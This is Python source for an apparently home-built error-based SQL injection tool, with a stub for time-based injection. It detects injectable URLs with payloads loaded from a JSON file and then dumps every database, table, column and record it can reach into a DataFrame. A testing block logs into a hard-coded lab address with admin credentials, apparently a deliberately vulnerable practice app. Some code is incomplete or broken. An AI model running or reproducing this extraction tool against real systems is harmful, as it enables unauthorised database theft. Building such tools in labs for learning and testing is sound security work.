import logging
import re
import json
import pandas

import requests

from typing import Generator, Union

from pandas import DataFrame

from utilities import log
from urllib.parse import quote_plus

PAYLOADS = json.load(open("payloads.json"))


class Attack:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url

    def run_payload(self, payload):
        attack_url: str = f"{self.base_url}{quote_plus(payload)}"
        response = self.session.get(attack_url)
        return attack_url, response


class ErrorBasedAttack(Attack):
    def __init__(self, session, base_url):
        super().__init__(session, base_url)
        self._description: str = "Error-based SQL injection"

        error_based = PAYLOADS["error-based"]
        self.error_patterns = error_based["error_patterns"]
        self.extractors = error_based["extractors"]
        self.injections = error_based["injections"]

    def iterate_injections(self):
        for injection in self.injections:
            yield injection["title"], injection["detect"], injection["exploit"]

    def extract(self, exploit_query, field, previous_fields):
        count = None
        for get_count_base_query in self.extractors[field]["get_count"]:
            try:
                get_count_query = get_count_base_query.format(**previous_fields)
                attack_url, response = self.run_payload(exploit_query.format(query=get_count_query))
                count = int(self._get_mysql_error(response))
                break
            except Exception:
                continue
        else:
            return []

        for base_extract_query in self.extractors[field]["extract"]:
            try:
                results = []
                for i in range(count):
                    extract_query = base_extract_query.format(index=i, **previous_fields)
                    attack_url, response = self.run_payload(exploit_query.format(query=extract_query))
                    data = self._get_mysql_error(response)
                    if not data:
                        break
                    results.append(data)
                else:
                    return results

            except Exception:
                continue

        return []

    def exploit(self, exploit_query):
        all_records = []

        logging.info("Extracting all databases...")
        for database in self.extract(exploit_query, "databases", {}):
            if database == "information_schema":
                continue

            logging.info(f"Extracting database {database}...")

            for table in self.extract(exploit_query, "tables", {"db": database}):
                logging.info(f"Extracting table {table}...")

                for column in self.extract(exploit_query, "columns", {"db": database, "tbl": table}):
                    logging.info(f"Extracting column {column}...")

                    for index, record in enumerate(
                            self.extract(exploit_query, "records", {"db": database, "tbl": table, "col": column})
                    ):
                        all_records.append({
                            "database": database,
                            "table": table,
                            "column": column,
                            "index": index,
                            "value": record
                        })

        return pandas.json_normalize(all_records) if all_records else None

    def attack(self) -> Union[DataFrame, None]:
        for title, detect_query, exploit_query in self.iterate_injections():
            attack_url, response = self.run_payload(detect_query)
            error_response = self._get_mysql_error(response=response)
            if not error_response:
                continue

            logging.critical(f"Detected error-based injection {title} with URL {attack_url}")

            records = self.exploit(exploit_query)

            if not records.empty:
                logging.info("Finished Error-based attack successfully!")
                return records

        logging.info("Couldn't find Error-based attacks!")
        return None

    def _get_mysql_error(self, response) -> Union[None, str]:
        # Extracted content from response object.
        _content = response.content.decode().lower()

        for _error in self.error_patterns:
            match = re.search(_error, _content)
            if match:
                return match.group("error_response")
        return None


class TimeBasedAttack(Attack):
    def __init__(self, session, base_url):
        super().__init__(session, base_url)
        self._description: str = "Time-based SQL injection"

    def detect(self):
        for attack_url, payload, response in self.run_payloads("error-based"):
            pass
            # if self._is_mysql_error(response=response):
            #     logging.critical(f"Detected error-based injection with URL {attack_url}")
            #     yield ['error-based', self._description, payload]


# Supported injection types with their corresponding classes.
INJECTION_CLASSES = {
    "error-based": ErrorBasedAttack,
    "time-based": TimeBasedAttack
}


class SQLInjection:
    """
    TODO: Document this class.
    """

    def __init__(self, injection_type, url: str) -> None:
        """
        TODO: document this.
        @param injection_types:
        @param url:
        @return: None.
        """

        # Initialize HTTP session.
        self._data = None
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, " \
                                             "like Gecko) Chrome/83.0.4103.106 Safari/537.36 "

        # Initialize needed fields
        self._url = url
        self._injection_class = INJECTION_CLASSES[injection_type]

        # ----------------------------------- #
        # TODO The following code is for testing purposes.
        login_payload = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
        }
        login_url = "http://172.19.217.41/login.php"
        r = self.session.get(login_url)
        token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
        login_payload['user_token'] = token
        self.session.post(login_url, data=login_payload)
        # ----------------------------------- #

    def attack(self) -> None:
        """
        TODO: Document this.
        @return:
        """

        # Detect vulnerabilities for provided injection class.
        attacker = self._injection_class(self.session, self._url)
        attack_result = attacker.attack()
        self._data = attack_result if not attack_result.empty else None

    def __str__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        return str(self._data) if not self._data.empty else "No data has been found."

    def __repr__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        return str(self._data) if not self._data.empty else "No data has been found."
